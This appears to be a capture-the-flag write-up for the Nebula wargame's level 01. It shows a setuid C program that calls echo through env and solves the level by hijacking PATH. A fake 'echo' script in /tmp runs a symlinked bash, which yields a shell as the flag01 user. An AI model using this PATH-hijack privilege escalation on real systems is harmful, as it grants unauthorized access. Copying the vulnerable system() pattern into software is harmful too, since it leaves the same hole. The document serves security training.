# Nebula - Level 01

## Info

Login: 		level01/level01

Topic:		Set User / Group ID Bits.  

## Description

The Code below allows arbitrary programs to execute it find it!

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}

```

## Ideas

The program is caling echo. If I can manage to change the Environment variable to get it runnig a shell. That would be great. The line `system("/usr/bin/env echo and now what?")` is of interest. `echo` is beeing called. `and now what` are parameters for `echo` . 

## Solution

Change the environment variable `PATH`. Add a directory where you can write to. In this case `tmp`

```bash
PATH=/tmp:$PATH
```

To get it known by the system you have to export it:

```bash
export PATH
```

Now If we type a comand name into commandline. The shell will also look in the directory `/tmp`. It is the first directory in the PATH variable and so it's the first place where the shell will look for programs. Now we can place a little shell script there to get executed. We name it `echo` . 

`echo -e '#!/bin/bash\n/tmp/echo2' > /tmp/echo`

This Script will call a shell to open up. So we also need a  shell to get opened. Make a symbolic ink to a shell. In this case Bash. We name it `echo2` because we call it with our script.

`ln -s /bin/bash /tmp/echo2`

Now it is important to make the Script executable. Without this modification it would not get found as a executable program via the `PATH`-variable. 

`chmod 755 /tmp/echo`

Now we can run `./flag01` and become the user `flag01`. Now we call `getflag` and the flag is ours.

